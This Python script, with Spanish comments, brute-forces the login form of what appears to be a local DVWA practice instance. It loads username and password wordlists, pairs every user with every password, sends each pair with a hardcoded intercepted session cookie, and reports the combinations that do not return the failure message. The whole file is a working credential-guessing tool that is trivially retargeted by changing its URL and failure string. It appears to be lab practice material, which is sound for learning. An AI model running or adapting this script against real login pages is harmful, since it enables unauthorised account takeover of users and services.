import requests
import itertools
#configuramos los parametros como la url, los archivos (diccionario) y cookie con el id de la sesion interceptada.
url = 'http://127.0.0.1:4280/vulnerabilities/brute/'
users = '/home/kali/Documents/user.txt'
passwords= '/home/kali/Documents/pass.txt'
cookie = 'security=low; PHPSESSID=8bf6c05ef485d4bcaae25dd50977b0ea'

def ataque(url, users_file, passwords_file, cookie):
    session = requests.Session()
    Combinaciones_exitosas = []
    
    with open(users_file, 'r') as user_f, open(passwords_file, 'r') as pass_f:
        users = [line.strip() for line in user_f]
        passwords = [line.strip() for line in pass_f]
        
    for username, password in itertools.product(users, passwords):
        headers = {
            'Cookie': cookie
        }
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        response = session.get(url, params=data, headers=headers)
        print(f"Probando - Usuario: {username}, Contraseña: {password}")
        
        if "Username and/or password incorrect" not in response.text:
            print(f"Éxito! Usuario: {username}, Contraseña: {password}")
            Combinaciones_exitosas.append((username, password))
    
    if Combinaciones_exitosas:
        print("\nCombinaciones exitosas:")
        for username, password in Combinaciones_exitosas:
            print(f"Usuario: {username}, Contraseña: {password}")
    else:
        print("No se encontraron combinaciones correctas.")
ataque(url, users, passwords, cookie)

